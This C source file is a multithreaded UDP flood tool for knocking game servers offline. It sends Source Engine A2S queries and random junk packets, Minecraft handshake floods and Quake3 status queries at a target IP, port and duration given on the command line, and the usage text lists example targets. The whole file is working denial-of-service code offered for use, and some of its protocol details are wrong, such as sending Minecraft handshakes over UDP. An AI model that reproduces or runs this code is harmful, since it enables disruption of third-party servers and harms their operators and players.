// gameserver.c - Real Game Server Protocol Flood
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <sys/time.h>

#define THREADS 20
#define BUF_SIZE 2048
#define MAX_GAME_PAYLOAD 1472

volatile int running = 1;

void flood_source_engine(char *ip, int port) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in target = {0};
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);
    
    // Source Engine A2S_INFO query flood (CS:GO, TF2, etc.)
    char query[] = "\xFF\xFF\xFF\xFF\x54Source Engine Query";
    char challenge[32];
    
    struct timeval end;
    gettimeofday(&end, NULL);
    end.tv_sec += 30; // Hardcoded 30s for demo
    
    while (running) {
        struct timeval now;
        gettimeofday(&now, NULL);
        if (now.tv_sec > end.tv_sec) break;
        
        // A2S_INFO (0x54)
        sendto(sock, query, sizeof(query)-1, 0, (struct sockaddr*)&target, sizeof(target));
        
        // A2S_PLAYER (0x55)
        sendto(sock, "\xFF\xFF\xFF\xFF\x55", 6, 0, (struct sockaddr*)&target, sizeof(target));
        
        // A2S_RULES (0x56)
        sendto(sock, "\xFF\xFF\xFF\xFF\x56", 6, 0, (struct sockaddr*)&target, sizeof(target));
        
        // Junk packets
        char junk[MAX_GAME_PAYLOAD];
        for (int i = 0; i < MAX_GAME_PAYLOAD; i++) junk[i] = rand() % 256;
        sendto(sock, junk, MAX_GAME_PAYLOAD, 0, (struct sockaddr*)&target, sizeof(target));
        
        usleep(50); // 20k PPS/thread
    }
    close(sock);
}

void flood_minecraft(char *ip, int port) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in target = {0};
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);
    
    // Minecraft handshake flood (protocol 760+)
    char handshake[] = {
        0x00, 0x00, // Packet length
        0x00, 0x04, // Handshake packet ID
        0x00, 0x00, // Protocol version (flood all versions)
        0x00, 0x00, // Server address length
        0x00,       // Next state
    };
    
    struct timeval end;
    gettimeofday(&end, NULL);
    end.tv_sec += 30;
    
    while (running) {
        struct timeval now;
        gettimeofday(&now, NULL);
        if (now.tv_sec > end.tv_sec) break;
        
        // Flood handshakes (forces server processing)
        for (int proto = 47; proto < 760; proto += 10) {
            char pkt[BUF_SIZE];
            memset(pkt, 0, sizeof(pkt));
            pkt[0] = 0x02; // Length
            pkt[1] = 0x00; // Handshake ID
            pkt[2] = (proto >> 8) & 0xFF;
            pkt[3] = proto & 0xFF;
            
            sendto(sock, pkt, 4, 0, (struct sockaddr*)&target, sizeof(target));
        }
        
        usleep(100);
    }
    close(sock);
}

void flood_quake(char *ip, int port) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in target = {0};
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip, &target.sin_addr);
    
    // Quake3/QuakeLive status/info flood
    char queries[] = {
        0xFF, 0xFF, 0xFF, 0xFF, 'g', 'e', 't', 's', 't', 'a', 't', 'u', 's', '\n',
        0xFF, 0xFF, 0xFF, 0xFF, 'g', 'e', 't', 'i', 'n', 'f', 'o', '\n'
    };
    
    struct timeval end;
    gettimeofday(&end, NULL);
    end.tv_sec += 30;
    
    while (running) {
        struct timeval now;
        gettimeofday(&now, NULL);
        if (now.tv_sec > end.tv_sec) break;
        
        sendto(sock, queries, sizeof(queries), 0, (struct sockaddr*)&target, sizeof(target));
        usleep(50);
    }
    close(sock);
}

void *game_flood(void *arg) {
    char *data = (char*)arg;
    char *ip = data;
    int port = *(int*)(data + 256);
    
    // Auto-detect game type by port
    if (port == 25565 || port == 19132) {
        flood_minecraft(ip, port);
    } else if (port >= 27000 && port <= 28000) {
        flood_source_engine(ip, port);
    } else {
        flood_quake(ip, port);
    }
    
    return NULL;
}

void sig_handler(int sig) { running = 0; }

int main(int argc, char **argv) {
    if (argc != 4) {
        printf("Usage: sudo ./gameserver IP PORT SECONDS\n");
        printf("Examples:\n");
        printf("  CS:GO/TF2: ./gameserver 1.2.3.4 27015 60\n");
        printf(" Minecraft: ./gameserver 1.2.3.4 25565 30\n");
        printf("   Quake3: ./gameserver 1.2.3.4 27960 45\n");
        return 1;
    }
    
    signal(SIGINT, sig_handler);
    
    char target[512];
    strncpy(target, argv[1], 256);
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    
    memcpy(target + 256, &port, 4);
    
    printf("[*] Game Server Protocol Flood\n");
    printf("[*] Target: %s:%d (%ds)\n", argv[1], port, duration);
    
    if (port == 25565) printf("[*] Mode: Minecraft Handshake Flood\n");
    else if (port >= 27000) printf("[*] Mode: Source Engine A2S Flood\n");
    else printf("[*] Mode: Quake Protocol Flood\n");
    
    srand(time(NULL));
    
    pthread_t threads[THREADS];
    for (int i = 0; i < THREADS; i++) {
        pthread_create(&threads[i], NULL, game_flood, target);
    }
    
    sleep(duration);
    running = 0;
    
    for (int i = 0; i < THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n[*] Flood completed\n");
    return 0;
}
